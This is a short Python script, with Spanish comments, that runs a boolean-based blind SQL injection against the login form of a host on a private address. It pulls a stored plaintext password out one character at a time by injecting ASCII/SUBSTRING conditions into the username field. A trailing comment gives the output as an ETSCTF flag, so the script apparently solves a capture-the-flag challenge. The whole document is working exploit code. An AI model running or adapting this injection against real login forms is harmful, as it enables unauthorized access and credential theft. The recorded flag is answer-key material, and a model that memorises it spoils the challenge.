import requests

url = "http://10.0.160.71:4000/dashboard"
success_indicator = "Hi there admin"  # Cambia esto según la respuesta de éxito

def is_successful(response_text):
    return success_indicator in response_text

def send_payload(payload):
    headers = {"Content-Type": "application/x-www-form-urlencoded"}
    data = {
        'userName': payload,
        'password': 'password'  # Asume que el campo de contraseña es requerido
    }
    response = requests.post(url, data=data, headers=headers)
    return is_successful(response.text)

def extract_character(position):
    for char in range(32, 127):  # Rango de caracteres imprimibles
        payload = f"admin' OR ASCII(SUBSTRING((pwplain), {position},1)) = {char}-- -"
        #payload = f"admin' OR 1=1-- -"
        sp = send_payload(payload)
        if sp:
            return chr(char)
    return None

def extract_file():
    result = ""
    position = 1
    while True:
        
        character = extract_character(position)
        if character is None:
            break
        result += character
        position += 1
        print(f"Password: {result}")
    return result

print("Complete Password:",extract_file())
#OUT:    ETSCTF_68a6e1980b15fc93c5836c3ba7195f5b